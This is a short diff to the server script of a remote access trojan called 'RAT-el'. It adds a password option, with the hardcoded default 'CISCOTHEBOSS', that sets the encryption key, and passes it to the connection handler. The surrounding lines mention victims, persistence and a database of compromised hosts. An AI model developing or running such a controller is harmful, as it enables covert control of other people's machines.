@@ -30,6 +30,8 @@ parser.add_argument("-d","--display", action="store_false", default=True, help="
 parser.add_argument("-t","--time", dest="TIME", default=5, help="the number of seconds of automatic message sending to check if the connection is alive or dead.")
 #parser.add_argument("-a","--auto", action="store_true", default=False,help="if the -a or --auto parameter is added then all victims will perform persistence automatically.")
 parser.add_argument("-c","--clean", dest="CLEAN", action="store_true", default=False, help="cleans all the data in the database.")
+parser.add_argument("-pa", "--password", dest="PASSWORD", default="CISCOTHEBOSS", help="The password to generate the key to encrypt and decrypt the data. The default password is 'CISCOTHEBOSS'.")
+
 try:
     argv = vars(parser.parse_args())
 
@@ -38,6 +40,7 @@ try:
     DISPLAY = bool(argv["display"])
     TIME = int(argv["TIME"])
     CLEAN = float(argv["CLEAN"])
+    PASSWORD = str(argv["PASSWORD"])
 
     print(os.getcwd())
 
@@ -51,7 +54,7 @@ else:
     
     SqlObj = Sql("sql/RAT-el.sqlite3", "sql/table_ratel.sql", "table_ratel")
 
-    handler= Handler(HOST,PORT,DISPLAY,SqlObj)
+    handler= Handler(HOST,PORT,DISPLAY,SqlObj,PASSWORD) 
     handler.initialization()
     
     management = Management(TIME,SqlObj) #2 seconds.
